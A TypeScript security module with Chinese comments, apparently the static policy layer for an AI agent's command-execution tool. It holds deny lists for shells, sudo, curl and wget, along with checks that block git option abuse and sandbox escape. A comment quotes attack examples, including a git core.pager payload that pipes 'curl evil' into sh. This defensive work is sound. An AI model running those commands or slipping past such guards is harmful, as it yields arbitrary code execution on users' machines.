/**
 * sys.exec 的静态策略层（纯函数，不碰进程、不碰 fs 之外的副作用）。
 *
 * 四层防御里这是前两层，且**必须**与第三层（审批）分开实现：
 *   1) 白名单（EXEC_TOOL_ALLOWLIST，空 = 全拒）
 *   2) 解释器兜底拒绝（白名单只保证「启动的是哪个可执行文件」，不保证「它做什么」）
 *   3) 审批（hard / two_step，见 security-gateway.assessRisk）
 *   4) 事后审计（command/args/cwd/exitCode 全量入 tool_results）
 *
 * 为什么第 2 层不可省：`node -e`、`git -c core.pager=<cmd>`、`npm run <任意脚本>`
 * 都是「白名单内的一击即穿」。仅靠白名单等于把 RCE 门槛降成「猜对一个包名」。
 *
 * 明确不拦的东西：args 里的 shell 元字符（`;` `&&` `>` `$( )`）。因为 spawn 不经 shell，
 * 这些字符只是普通字符串；拦了会把 `git commit -m "a; b"` 误伤成注入。
 */

import { statSync } from 'node:fs';
import path from 'node:path';
import { config } from '../../config/env.js';

/**
 * 一律拒绝的命令名（不依赖白名单是否配置）。
 * 这些都是「把任意字符串当程序执行」的入口，白名单里出现也不要放行。
 */
export const DENIED_COMMANDS: readonly string[] = [
  // POSIX shell
  'sh',
  'bash',
  'zsh',
  'dash',
  // Windows shell
  'cmd',
  'powershell',
  'pwsh',
  // 提权
  'sudo',
  'su',
  'doas',
  // 下载即执行（把互联网变成命令源）
  'curl',
  'wget',
];

/** Windows 下无法在 shell:false 直接启动的脚本类型（.cmd/.bat 必须由 cmd.exe 解释）。 */
const WINDOWS_SCRIPT_EXT = /\.(cmd|bat|ps1|vbs)$/i;

/** 各解释器的「内联执行」开关：出现即视为解释器调用，直接拒绝。 */
const INTERPRETER_FLAGS: Record<string, string[]> = {  sh: ['-c'],
  bash: ['-c'],
  zsh: ['-c'],
  dash: ['-c'],
  cmd: ['/c', '/k'],
  powershell: ['-command', '-c', '-encodedcommand', '/c'],
  pwsh: ['-command', '-c', '-encodedcommand', '/c'],
};

/** git 选项处理的一次命中：给调用方足够信息拼出「具体原因 + 可执行替代方案」。 */
export interface GitArgViolation {
  arg: string;
  reason: string;
  suggestion: string;
}

/** 子命令无关的危险选项（任何位置、任何子命令下都拒）。 */
const GIT_GLOBAL_DANGEROUS_OPTIONS: readonly string[] = [
  '--exec-path',
  '--upload-pack',
  '--receive-pack',
  '--exec',
  '--config',
  '--config-env',
  // 与 -C 同类：显式把 git 的工作目录/元数据目录指到任意位置（含沙箱外）。
  '--git-dir',
  '--work-tree',
  '--git-common-dir',
];

/** 会拉起宿主浏览器/GUI 的子命令：不执行我们给的字符串，但会启动宿主的默认程序。 */
const GIT_LAUNCHER_SUBCOMMANDS: readonly string[] = ['instaweb', 'web--browse', 'gui', 'citool'];

/** `git config` 里会把配置写到沙箱外并跨调用持久化的选项。 */
const GIT_CONFIG_ESCAPE_OPTIONS: readonly string[] = ['--global', '--system', '--file', '-f'];

/**
 * 「配置即命令」的键：写进仓库自己的 `.git/config` 后，下一次 git 调用会把它们当程序启动。
 * 我们注入的 `GIT_CONFIG_*` 只覆盖 hooksPath / diff.external / core.pager，
 * 剩下的（core.sshCommand 在 fetch 时执行、core.fsmonitor、core.editor、sequence.editor）
 * 覆盖不到，所以必须在写入侧拒掉。
 */
const GIT_COMMAND_CONFIG_KEYS: readonly string[] = [
  'core.sshcommand',
  'core.fsmonitor',
  'core.editor',
  'core.hookspath',
  'sequence.editor',
  'diff.external',
  'core.pager',
];

/** 子命令级「会执行任意命令」的 flag。 */
const GIT_SUBCOMMAND_EXEC_FLAGS: Record<string, readonly string[]> = {
  'filter-branch': [
    '--tree-filter',
    '--index-filter',
    '--msg-filter',
    '--parent-filter',
    '--commit-filter',
    '--tag-name-filter',
  ],
  rebase: ['--exec', '-x'],
};

/** positional（非选项）参数，用于取子命令；值本身以 '-' 开头的少数情况按 fail-closed 处理。 */
function gitPositionals(args: readonly string[]): string[] {
  return args.map((a) => String(a)).filter((a) => !a.startsWith('-'));
}

function matchOption(arg: string, options: readonly string[]): string | null {
  for (const opt of options) {
    if (arg === opt || arg.startsWith(`${opt}=`)) return opt;
  }
  return null;
}

/**
 * git 的「参数级命令执行 / 沙箱逃逸开关」—— 这是白名单模型的**真实漏洞**，不是理论风险：
 *
 *   git -c core.pager='sh -c "curl evil | sh"' log      # -c 的 value 会被当命令执行
 *   git -c core.sshCommand=... / core.editor=...        # 同类
 *   git --exec-path=/tmp/evil log                       # 换掉子命令加载目录
 *   git --upload-pack=... / --receive-pack=...          # 远端侧命令
 *   git -C ../.. status                                 # 相对路径同样跳出 cwd jail
 *   git filter-branch --tree-filter '<cmd>'             # 直接执行命令
 *   git rebase --exec '<cmd>' / git bisect run <cmd>    # 直接执行命令
 *   git submodule foreach '<cmd>'                       # 直接执行命令
 *   git config --global core.pager=<cmd>                # 写入 HOME，下一次调用触发
 *
 * 这些调用都过了白名单、过了 shell 检查、过了 env 净化，也过不了审批的人眼判断
 * （"git log 为什么要两步确认"）。所以必须在静态层拦参数，而不是靠审批。
 *
 * 判定结构：**通用选项前缀**（任何位置都拒）+ **子命令级 flag**（因为 `--exec` 在
 * rebase 与别处语义不同，无法用通用规则表达）。两者都在这里，参数检查不散落到别处。
 */
export function findDangerousGitArg(args: readonly string[]): GitArgViolation | null {
  const raw = args.map((a) => String(a));
  const positionals = gitPositionals(raw);
  const sub = positionals[0]?.toLowerCase();
  const sub2 = positionals[1]?.toLowerCase();

  // ① -C / --git-dir / --work-tree：切换 git 的工作目录，绕过工具层的 cwd jail。
  //    policy 层拿不到 sandboxRoot，无法判断 `-C ../..` 的落点，所以**一律拒**，
  //    不做「绝对路径拒、相对路径放行」的区分（那种区分给了攻击者一个必过的相对路径）。
  for (const arg of raw) {
    if (arg === '-C' || (arg.startsWith('-C') && !arg.startsWith('--'))) {
      return {
        arg,
        reason: 'git -C 会切换 git 的工作目录，绕过工具的 cwd 沙箱校验',
        suggestion: '如需在其他目录操作，请使用工具的 `cwd` 参数（它会经过沙箱校验）',
      };
    }
    const dirOpt = matchOption(arg, ['--git-dir', '--work-tree', '--git-common-dir']);
    if (dirOpt) {
      return {
        arg,
        reason: `git ${dirOpt} 会把 git 的工作目录/元数据目录指到沙箱外`,
        suggestion: '如需在其他目录操作，请使用工具的 `cwd` 参数（它会经过沙箱校验）',
      };
    }
  }

  // ② -c / --config[-env] / --exec-path / --upload-pack / --receive-pack / --exec
  for (const arg of raw) {
    // -c key=value：value 会被 git 当命令或程序路径使用（pager/editor/sshCommand/diff.external…）。
    // 大小写敏感：大写 -C（切换目录）已在 ① 单独处理。
    //
    // 已知误伤（刻意接受）：`git commit -c <commit>`（复用提交信息）同样是 `-c`，
    // 会被一并拒绝。宁可误伤也不漏放 —— 漏放一次就是任意命令执行，误伤的代价只是
    // Agent 少一种写法（可用 `git log -1 --format=%B <commit>` 替代）。
    if (arg === '-c' || (arg.startsWith('-c') && !arg.startsWith('--'))) {
      return {
        arg,
        reason: 'git -c <key>=<value> 的 value 会被 git 当作命令或程序路径执行',
        suggestion: '`git -c <key>=<value>` 可让 git 执行任意命令，请改用环境变量或直接执行目标程序',
      };
    }
    const opt = matchOption(arg, GIT_GLOBAL_DANGEROUS_OPTIONS);
    if (opt) {
      return {
        arg,
        reason: `git ${opt} 会让 git 执行任意命令或从任意位置加载程序`,
        suggestion: '请不要通过 git 选项改变它的执行链；直接调用目标程序更可控',
      };
    }
  }

  // ③ 子命令级「执行任意命令」的 flag
  const execFlags = sub ? GIT_SUBCOMMAND_EXEC_FLAGS[sub] : undefined;
  if (execFlags) {
    for (const arg of raw) {
      if (arg === '-x' || arg.startsWith('-x')) {
        if (execFlags.includes('-x')) {
          return {
            arg,
            reason: `git ${sub} -x 会执行后续命令`,
            suggestion: '请把要做的事拆成显式命令逐步确认，不要用 git 的 exec 类开关',
          };
        }
      }
      const hit = matchOption(arg, execFlags);
      if (hit) {
        return {
          arg,
          reason: `git ${sub} ${hit} 会执行任意命令`,
          suggestion: '请把要做的事拆成显式命令逐步确认，不要用 git 的 exec 类开关',
        };
      }
    }
  }

  // ④ 子命令名本身就是「执行器」的形态
  if (sub === 'bisect' && sub2 === 'run') {
    return {
      arg: 'bisect run',
      reason: 'git bisect run <cmd> 会执行任意命令',
      suggestion: '请手动逐点验证，不要用 bisect run 执行脚本',
    };
  }
  if (sub === 'submodule' && sub2 === 'foreach') {
    return {
      arg: 'submodule foreach',
      reason: 'git submodule foreach <cmd> 会在每个子模块里执行任意命令',
      suggestion: '请用 fs.list / fs.read 逐个子模块查看，不要用 foreach 执行命令',
    };
  }
  if (sub === 'filter-repo') {
    return {
      arg: 'filter-repo',
      reason: 'git filter-repo 会执行仓库内配置的过滤器程序',
      suggestion: '请改用只读的历史查询（git log / git show）',
    };
  }

  // ⑤ 会拉起宿主默认程序（浏览器 / GUI）的子命令：
  //    它们本身不执行我们给的字符串，但会启动宿主的默认处理程序 —— 等价于
  //    「让 agent 决定运行哪个本地程序」，所以按执行面处理。
  if (sub !== undefined && GIT_LAUNCHER_SUBCOMMANDS.includes(sub)) {
    return {
      arg: sub,
      reason: `git ${sub} 会拉起宿主的浏览器/GUI 程序`,
      suggestion: '请改用命令行只读查询（git log / git show / git status）',
    };
  }
  if (sub === 'help' && raw.some((arg) => arg === '-w' || arg === '--web')) {
    return {
      arg: 'help -w',
      reason: 'git help -w 会拉起宿主默认浏览器',
      suggestion: '请直接用命令行查询（git help <cmd> 以外的方式），不要启动外部程序',
    };
  }

  // ⑤ git config 写到沙箱外（--global/--system/--file）：跨调用持久化，
  //    下一次任意 git 调用都可能触发 core.pager / core.sshCommand / alias '!cmd'。
  if (sub === 'config') {
    for (const arg of raw) {
      if (arg === '-f' || arg.startsWith('-f') && !arg.startsWith('--')) {
        return {
          arg,
          reason: 'git config -f <file> 可指向沙箱外的任意配置文件',
          suggestion: '只读查询请用 `git config --get <key>`；本地写入请使用仓库内的默认配置文件',
        };
      }
      const hit = matchOption(arg, GIT_CONFIG_ESCAPE_OPTIONS);
      if (hit) {
        return {
          arg,
          reason: `git config ${hit} 会写入沙箱外并跨调用持久化（可被后续 git 调用当作命令执行）`,
          suggestion: '只读查询请用 `git config --get <key>`；需要改本地配置请不带 --global/--system/--file',
        };
      }
    }

    // ⑤b 「本地作用域」也要看**写的是哪个键**：
    //     `git config alias.x '!sh -c …'` 写进仓库自己的 .git/config 后，`git x`
    //     就是任意命令执行 —— 而 `GIT_CONFIG_*` 注入层里没有 alias，覆盖不掉它。
    //     这条属于「只读放行」的边界，必须一并在静态层拒掉，否则 C 类的放行口子
    //     本身就是一条命令执行路径。
    const key = positionals[1]?.toLowerCase();
    const value = positionals[2];
    // 只对「写」生效：--get / --get-all / --get-regexp / --list / --unset 都是读或撤销，
    // 不会把新命令写进配置（--unset 只删不改，反而是安全的）。
    const isReadOrUnset = raw.some(
      (arg) =>
        arg === '-l' ||
        arg.startsWith('--get') ||
        arg === '--list' ||
        arg === '--unset' ||
        arg === '--unset-all',
    );
    if (key !== undefined && !isReadOrUnset) {
      if (key.startsWith('alias.') && typeof value === 'string' && value.trimStart().startsWith('!')) {
        return {
          arg: key,
          reason: `git config ${key} '!<cmd>' 会让 git 把该 alias 当命令执行`,
          suggestion: '请直接调用目标程序（sys.exec 需要用户确认），不要用 alias 藏命令',
        };
      }
      if (GIT_COMMAND_CONFIG_KEYS.includes(key)) {
        return {
          arg: key,
          reason: `git config ${key} 指定的是 git 会当作程序执行的外部命令`,
          suggestion: '请不要通过仓库配置改变 git 的执行链；直接调用目标程序更可控',
        };
      }
    }
  }

  return null;
}



export type ExecCommandVerdict =
  | { ok: true; command: string; allowlistedAs: string }
  | { ok: false; code: 'INVALID_ARGS' | 'SECURITY_DENIED'; message: string; suggestion?: string };

/** 白名单条目统一成小写比较（Windows 命令名大小写不敏感）。 */
function normalize(name: string): string {
  return name.trim().toLowerCase();
}

/**
 * 命令形态校验 + 白名单判定。
 *
 * `command` 只接受**逻辑名**（basename），不接受路径：
 * `./evil-git`、`C:\tmp\git.exe`、`..\git` 一律 INVALID_ARGS ——
 * 允许路径就等于允许执行沙箱里任意一个刚被 fs.write 写出来的文件。
 */
export function evaluateExecCommand(
  command: string,
  args: readonly string[],
  allowlist: readonly string[] = config.execToolAllowlist,
): ExecCommandVerdict {
  if (typeof command !== 'string' || command.trim() === '') {
    return { ok: false, code: 'INVALID_ARGS', message: 'command 不能为空' };
  }
  const raw = command.trim();
  if (raw.length > 64) {
    return { ok: false, code: 'INVALID_ARGS', message: 'command 过长（上限 64 字符）' };
  }
  if (/[\u0000-\u001f]/.test(raw)) {
    return { ok: false, code: 'INVALID_ARGS', message: 'command 含控制字符' };
  }
  // 路径形态：分隔符 / 盘符 / UNC / 相对路径前缀。
  const looksLikePath =
    /[\\/]/.test(raw) || /^[a-zA-Z]:/.test(raw) || raw.startsWith('.') || raw.startsWith('~');
  if (looksLikePath) {
    return {
      ok: false,
      code: 'INVALID_ARGS',
      message: `command 只接受逻辑命令名（如 git / node），不接受路径：${raw}`,
      suggestion: '把命令名与参数分开传：command="git"，args=["status"]',
    };
  }

  const name = normalize(raw);

  if (WINDOWS_SCRIPT_EXT.test(name)) {
    return {
      ok: false,
      code: 'SECURITY_DENIED',
      message: `${raw} 是 Windows 脚本（.cmd/.bat 等），不经 shell 无法启动`,
      suggestion: 'Windows 下需通过 node 直接调用脚本，例如 `node node_modules/<pkg>/<entry>.mjs`',
    };
  }

  if (DENIED_COMMANDS.includes(name)) {
    return {
      ok: false,
      code: 'SECURITY_DENIED',
      message: `命令 ${raw} 属于解释器/提权/下载类，禁止通过 sys.exec 调用`,
      suggestion: '把要做的事写成脚本文件，用白名单内的解释器（如 node）显式执行',
    };
  }

  const flags = INTERPRETER_FLAGS[name];
  if (flags) {
    const lowered = args.map((a) => String(a).toLowerCase());
    if (lowered.some((a) => flags.includes(a))) {
      return {
        ok: false,
        code: 'SECURITY_DENIED',
        message: `命令 ${raw} 带内联执行开关，等价于执行任意字符串`,
      };
    }
  }

  // git 的参数级命令执行 / 沙箱逃逸开关（-c / -C / --exec-path / filter-branch …）。
  // 放在白名单判定之前：理由见 findDangerousGitArg 的注释 —— 这是「过了白名单
  // 依然能拿到任意命令执行或访问沙箱外」的现实路径，必须在总闸就被拒，且给出具体原因。
  if (name === 'git') {
    const violation = findDangerousGitArg(args);
    if (violation) {
      return {
        ok: false,
        code: 'SECURITY_DENIED',
        message: `git 参数 ${violation.arg} 被拒绝：${violation.reason}`,
        suggestion: violation.suggestion,
      };
    }
  }

  // fail-closed：空白名单 = 全拒。这里刻意不写 `allowlist.length === 0 → 放行`。
  const normalizedAllow = allowlist.map(normalize).filter((v) => v.length > 0);
  if (normalizedAllow.length === 0) {
    return {
      ok: false,
      code: 'SECURITY_DENIED',
      message: 'EXEC_TOOL_ALLOWLIST 为空，命令执行工具全部拒绝（fail-closed）',
      suggestion: '在服务端配置里显式填写允许的命令（如 EXEC_TOOL_ALLOWLIST=git,node）',
    };
  }
  if (!normalizedAllow.includes(name)) {
    return {
      ok: false,
      code: 'SECURITY_DENIED',
      message: `命令 ${raw} 不在白名单内（当前白名单：${normalizedAllow.join(',')}）`,
      suggestion: `如确需执行，请由用户显式把 ${name} 加入 EXEC_TOOL_ALLOWLIST`,
    };
  }

  return { ok: true, command: raw, allowlistedAs: name };
}

/**
 * 需要「两步确认」的执行形态。
 *
 * 为什么返回 boolean 而不是「参数 → 审批档」的映射表：映射表是个双向开关 ——
 * 一旦有人为了减少审批噪音往表里加一行 `git: 'hard'`，就等于**顺手把 exec 降级**，
 * 而且改动看起来完全无害（只是加了一条映射）。boolean 只有「升级」这一种表达能力，
 * 调用点无法用它做降级，未来的重构者也没有「加一行就降级」的入口。
 * 这是刻意的不对称：安全属性靠结构保证，不靠代码评审的记忆。
 *
 * - node：等同允许 Agent 执行任意代码（`node -e` 一行就能读写整个用户目录）。
 * - git push / clone / fetch / pull / ls-remote / submodule update：把数据送出或取回沙箱，
 *   且不受 HTTP 工具的 SSRF / 域名白名单约束（拉取仓库是合理需求，所以只升级不拒绝）。
 * - git reset --hard / git clean：丢弃工作区改动，不可恢复。
 */

/** 会把数据送出/取回沙箱的 git 子命令：不拒，但必须人确认。 */
const GIT_NETWORK_SUBCOMMANDS: readonly string[] = [
  'push',
  'clone',
  'fetch',
  'pull',
  'ls-remote',
  'send-email',
  'daemon',
  'http-backend',
  'request-pull',
];

export function execRequiresTwoStep(command: string, args: readonly string[]): boolean {
  const name = normalize(command);
  if (name === 'node') return true;
  if (name === 'git') {
    const positional = args.map((a) => String(a)).filter((a) => !a.startsWith('-'));
    const sub = positional[0]?.toLowerCase();
    const sub2 = positional[1]?.toLowerCase();
    // 出网：clone/fetch/pull/push/ls-remote/send-email/daemon/request-pull 等会把数据
    // 送出或取回沙箱，而且不受 HTTP 工具的 SSRF/域名白名单约束 —— 拉取仓库是合理需求，
    // 所以不拒，但必须人确认。
    if (sub !== undefined && GIT_NETWORK_SUBCOMMANDS.includes(sub)) return true;
    // `git archive` 本地打包是只读的；带 --remote 时由远端生成并回传，属于出网。
    if (sub === 'archive' && args.some((a) => String(a) === '--remote' || String(a).startsWith('--remote='))) {
      return true;
    }
    // submodule 的 update 与 add 都会出网（add 还要克隆 + 写 .gitmodules），
    // 必须同样对待 —— 只升 update 会留下「换个入口就绕过」的缺口。
    if (sub === 'submodule' && (sub2 === 'update' || sub2 === 'add')) return true;
    // 本地不可逆操作
    if (sub === 'clean') return true;
    if (sub === 'reset' && args.some((a) => String(a) === '--hard')) return true;
  }
  return false;
}

/** 净化 PATH：去空段、去首尾空白、去引号（Windows 上常见 "C:\a; C:\b" 写法）。 */
export function sanitizedPath(source: NodeJS.ProcessEnv = process.env): string {
  const raw = source.PATH ?? source.Path ?? '';
  return String(raw)
    .split(path.delimiter)
    .map((segment) => segment.trim().replace(/^"|"$/g, ''))
    .filter((segment) => segment.length > 0)
    .join(path.delimiter);
}

/**
 * 用 PATH 把逻辑命令名解析成绝对路径。
 * 只认原生可执行文件：Windows 上加 .exe/.com，绝不去匹配 .cmd/.bat
 * （那些需要 cmd.exe 解释，等于把 shell 请回来）。
 */
export function resolveExecutable(command: string, source: NodeJS.ProcessEnv = process.env): string | null {
  const pathValue = sanitizedPath(source);
  if (!pathValue) return null;
  const exts = process.platform === 'win32' ? ['.exe', '.com'] : [''];
  for (const dir of pathValue.split(path.delimiter)) {
    for (const ext of exts) {
      const candidate = path.join(dir, command + ext);
      try {
        if (statSync(candidate).isFile()) return candidate;
      } catch {
        // 不存在 / 无权限：继续找下一个目录
      }
    }
  }
  return null;
}

/**
 * 子进程环境变量：**白名单构造**，绝不继承 process.env。
 *
 * 黑名单必然漏（新增一个 key 就泄露一个），而仓库里现成的坑就有
 * LLM_SERVER_API_KEY / JUDGE_DEEP_API_KEY / AGENT_APPROVAL_SECRET。
 * 放行清单只留「程序正常跑起来所必需」的最小集合。
 */
const ENV_ALLOWLIST: readonly string[] = [
  'PATH',
  'HOME',
  'USERPROFILE',
  'SystemRoot',
  'TEMP',
  'TMP',
  'LANG',
  'LC_ALL',
  'NODE_ENV',
];

/** 即使白名单写错，也不允许把疑似密钥键传下去（冗余，但便宜）。 */
const SECRET_KEY_RE = /(_KEY|_SECRET|_TOKEN)$/i;

export function assertNoSecretEnv(env: Record<string, string>): void {
  for (const key of Object.keys(env)) {
    if (SECRET_KEY_RE.test(key)) {
      throw new Error(`sys.exec 拒绝了疑似密钥的环境变量键：${key}`);
    }
  }
}

/** 被强制指向的禁用路径（沙箱内、永不创建）；hooks 与 diff.external 共用。 */
export const DISABLED_HOOKS_DIRNAME = '.codelens-no-hooks';

/**
 * 构造子进程环境变量（白名单见上方的 ENV_ALLOWLIST）。
 *
 * `opts.command === 'git'` 时额外注入 `GIT_CONFIG_*`，把 `core.hooksPath` 指到一个
 * 永不存在的目录（见下方 D 段注释）；其他命令不受影响。
 */
export function buildExecEnv(
  source: NodeJS.ProcessEnv = process.env,
  opts: { command?: string; sandboxRoot?: string } = {},
): Record<string, string> {
  const out: Record<string, string> = {};
  for (const key of ENV_ALLOWLIST) {
    const value = source[key];
    if (typeof value === 'string' && value.length > 0) out[key] = value;
  }
  // 子进程的 PATH 用净化后的宿主值（与命令解析共用同一份，避免解析到 A 却执行到 B）。
  // ⚠️ 不要改成硬编码常量：Windows 上丢掉 System32 会让 node / git 直接起不来
  //    （找不到依赖 DLL 与系统命令），而这类失败会表现为「工具坏了」而不是「配置错了」。
  const cleanPath = sanitizedPath(source);
  if (cleanPath) out.PATH = cleanPath;

  // ── D. 中和 git 的「配置即命令」通道 ──────────────────────────────────
  // 攻击链：fs.write（只需 soft 审批）往沙箱内仓库的 `.git/config` 写
  //   [alias] x = !<cmd>  /  diff.external=<cmd>  /  core.pager=<cmd>
  // 或往 `.git/hooks/` 写 pre-commit —— 任意一次 git 调用就拿到命令执行，
  // 把 exec 的 hard/two_step 整个绕过。
  //
  // 缓解：走 git 2.31+ 的 `GIT_CONFIG_*` 环境变量通道（**不需要 -c**，而 -c 已被
  // 我们自己的规则拒掉），覆盖三个「配置即命令」的键：
  //   0) core.hooksPath  → 指到沙箱内永不存在的路径：封 `.git/hooks/*` 被触发
  //   1) diff.external   → 指到同一个不存在路径：封「普通 git diff 就执行它」
  //                        （这比 hook 更日常 —— 用户让 agent「看看改动」就会触发）
  //   2) core.pager=''   → 空串 = 不分页：封 core.pager=<cmd> 被当进程拉起
  //
  // ⚠️ 这不是「全封」：`GIT_CONFIG_*` 是**追加的高优先级层**，删不掉文件里已有的
  //    `alias.x = !<cmd>` —— `git x` 仍会执行。写入路径由 fs.write 侧的
  //    `.git/config` / `.git/hooks` 拦截（见 fs-write.tool.ts 的 gitExecutableSurfaceRejection）
  //    负责；剩下的来源只有「仓库自带的恶意 config」，属于克隆不可信仓库的固有风险。
  // ⚠️ 版本依赖（诚实标注）：git < 2.31 会**忽略**这些变量，等于没有这层保护。
  if (opts.command !== undefined && normalize(opts.command) === 'git' && opts.sandboxRoot) {
    const disabledPath = path.join(path.resolve(opts.sandboxRoot), DISABLED_HOOKS_DIRNAME);
    out.GIT_CONFIG_COUNT = '3';
    out.GIT_CONFIG_KEY_0 = 'core.hooksPath';
    out.GIT_CONFIG_VALUE_0 = disabledPath;
    out.GIT_CONFIG_KEY_1 = 'diff.external';
    out.GIT_CONFIG_VALUE_1 = disabledPath;
    out.GIT_CONFIG_KEY_2 = 'core.pager';
    out.GIT_CONFIG_VALUE_2 = '';
  }

  assertNoSecretEnv(out);
  return out;
}

/**
 * 超时口径：请求值 > 0 则取 min(请求值, 硬上限)；否则取默认值（同样受硬上限约束）。
 * 任何情况下都不会返回「无界」。
 */
export function resolveExecTimeout(
  requested: unknown,
  defaultMs: number = config.execToolTimeoutMs,
  maxMs: number = config.execToolMaxTimeoutMs,
): number {
  const hardMax = Number.isFinite(maxMs) && maxMs > 0 ? maxMs : 300000;
  const fallback = Number.isFinite(defaultMs) && defaultMs > 0 ? Math.min(defaultMs, hardMax) : hardMax;
  const value = typeof requested === 'number' ? requested : Number(requested);
  if (!Number.isFinite(value) || value <= 0) return fallback;
  return Math.min(Math.floor(value), hardMax);
}
